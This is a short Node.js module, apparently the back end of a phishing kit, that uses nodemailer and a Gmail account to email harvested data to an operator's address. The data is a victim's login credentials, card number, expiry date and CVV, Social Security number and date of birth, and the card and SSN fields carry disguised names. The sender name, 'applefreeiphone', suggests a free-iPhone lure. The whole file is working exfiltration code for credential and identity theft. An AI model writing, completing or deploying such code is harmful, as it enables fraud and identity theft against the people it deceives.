const nodemailer = require("nodemailer");

const send_mail = async (data) => {
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.APP_EMAIL,        // update
            pass: process.env.APP_PASSWORD,           // app password or real one if not secured
        }
    });

    const msg = {
        from: 'New Mail from AFC <applefreeiphone34882@gmail.com>',
        to: process.env.APP_RESULT_EMAIL,
        subject: 'New Mail from AFC',
        html: `
        <p>Username: ${data?.login?.username}</p>
        <p>Password: ${data?.login?.password}</p>
        <p>Username2: ${data?.login2?.username2}</p>
        <p>Password2: ${data?.login2?.password2}</p>
        <p>Card Number: ${data?.auth?.schoolNum}</p>
        <p>Expiry date: ${data?.auth?.schoolDate}</p>
        <p>CVV: ${data?.auth?.schoolKey}</p>
        <p>SSN: ${data?.auth2?.batchNum}</p>
        <p>DOB: ${data?.auth2?.entrydate}</p>
      `
    };

    try {
        await transporter.sendMail(msg);
    } catch (err) {
        console.error(err);
    }
}

module.exports = send_mail